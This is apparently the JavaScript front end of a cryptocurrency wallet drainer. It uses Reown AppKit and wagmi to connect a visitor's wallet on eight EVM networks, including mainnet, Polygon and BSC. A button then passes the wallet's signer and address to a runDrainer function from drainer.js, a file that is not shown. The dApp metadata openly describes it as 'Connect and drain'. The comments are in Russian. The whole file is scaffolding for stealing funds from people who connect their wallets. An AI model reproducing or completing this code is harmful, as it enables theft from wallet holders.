import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// Список всех EVM‑сетей
const networks = [ mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base ]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const metadata = {
  name: 'Alex dApp',
  description: 'Connect and drain',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: { analytics: true }
})

const connectBtn = document.getElementById('connect-btn')
const drainerBtn = document.getElementById('drainer-btn')
const status    = document.getElementById('status')

let provider = null
let signer   = null
let address  = null

// 1) Нажали «Подключить кошелёк»
connectBtn.addEventListener('click', () => {
  status.textContent = 'Открываю кошелёк…'
  modal.open()
})

// 2) Когда AppKit сообщил о connect — сохраняем провайдер/синер/адрес и включаем кнопку Drainer
modal.on('connect', async () => {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    signer   = provider.getSigner()
    address  = await signer.getAddress()
    status.textContent = `Подключено: ${address}`
    drainerBtn.disabled = false
  } catch (e) {
    console.error('Ошибка подключения:', e)
    status.textContent = `Ошибка подключения: ${e.message}`
  }
})

// 3) Нажали «Запустить Drainer»
drainerBtn.addEventListener('click', async () => {
  if (!signer || !address) {
    status.textContent = 'Сначала подключите кошелёк'
    return
  }
  drainerBtn.disabled = true
  status.textContent = 'Запускаю Drainer…'
  try {
    await runDrainer(provider, signer, address)
    status.textContent = '✅ Drainer выполнен'
  } catch (e) {
    console.error('Ошибка Drainer:', e)
    status.textContent = `❌ Ошибка: ${e.message}`
  } finally {
    drainerBtn.disabled = false
  }
})
